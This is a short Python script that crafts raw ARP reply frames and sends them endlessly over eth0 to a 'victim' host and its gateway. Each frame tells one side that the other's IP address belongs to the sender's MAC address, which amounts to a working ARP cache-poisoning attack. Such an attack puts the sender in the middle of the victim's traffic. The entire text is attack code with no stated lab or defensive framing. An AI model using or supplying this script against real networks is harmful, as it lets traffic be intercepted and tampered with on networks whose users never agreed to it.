import socket
import struct
import binascii
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
s.bind(("eth0",socket.htons(0x0800)))

sor = '\x0c\xd2\x92\x50\x36\x0b'
victmac ='\xd4\x3d\x7e\x9a\xE0\x37'

gatemac = '\x00\x22\x75\x94\x4c\x73'
code ='\x08\x06'

eth1 = victmac+sor+code #for victim
eth2 = gatemac +sor+code #for gateway

htype = '\x00\x01'
protype = '\x08\x00'
hsize = '\x06'
psize = '\x04'
opcode = '\x00\x02'

gate_ip = '192.168.2.1'
victim_ip = '192.168.2.10' 
gip = socket.inet_aton ( gate_ip )
vip = socket.inet_aton ( victim_ip )

arp_victim = eth1+htype+protype+hsize+psize+opcode+sor+gip+victmac+vip
arp_gateway= eth2+htype+protype+hsize+psize+opcode+sor+vip+gatemac+gip

while 1:
    s.send(arp_victim)
    s.send(arp_gateway)

